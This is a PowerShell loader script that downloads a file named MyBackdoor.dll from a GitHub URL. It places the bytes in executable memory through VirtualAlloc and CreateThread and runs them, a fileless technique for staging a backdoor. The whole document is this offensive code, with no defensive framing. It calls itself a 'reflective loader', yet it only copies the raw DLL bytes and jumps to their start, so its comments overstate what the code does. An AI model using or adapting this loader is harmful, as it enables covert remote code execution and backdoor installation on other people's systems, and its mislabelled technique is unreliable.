# loader.ps1

# 1) Download the DLL bytes
$payloadUrl = 'https://raw.githubusercontent.com/concentratedsulfuricacid/vector/main/MyBackdoor.dll'
Write-Host "[+] Downloading payload from $payloadUrl"
$dllBytes = (New-Object Net.WebClient).DownloadData($payloadUrl)

# 2) Define the real reflective loader
Add-Type -TypeDefinition @"
using System;
using System.Runtime.InteropServices;

public static class ReflectiveLoader {
    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr VirtualAlloc(
        IntPtr lpAddress, UIntPtr dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern IntPtr CreateThread(
        IntPtr lpThreadAttributes, UIntPtr dwStackSize,
        IntPtr lpStartAddress, IntPtr lpParameter,
        uint dwCreationFlags, out uint lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern uint WaitForSingleObject(
        IntPtr hHandle, uint dwMilliseconds);

    public static void LoadAndRun(byte[] rawAssembly) {
        // MEM_COMMIT | MEM_RESERVE = 0x1000 | 0x2000, PAGE_EXECUTE_READWRITE = 0x40
        IntPtr addr = VirtualAlloc(IntPtr.Zero, (UIntPtr)rawAssembly.Length, 0x3000, 0x40);
        Marshal.Copy(rawAssembly, 0, addr, rawAssembly.Length);
        uint threadId;
        IntPtr hThread = CreateThread(IntPtr.Zero, UIntPtr.Zero, addr, IntPtr.Zero, 0, out threadId);
        WaitForSingleObject(hThread, 0xFFFFFFFF);
    }
}
"@

# 3) Load and execute the payload
Write-Host "[+] Reflectively loading payload.dll into memory"
[ReflectiveLoader]::LoadAndRun($dllBytes)
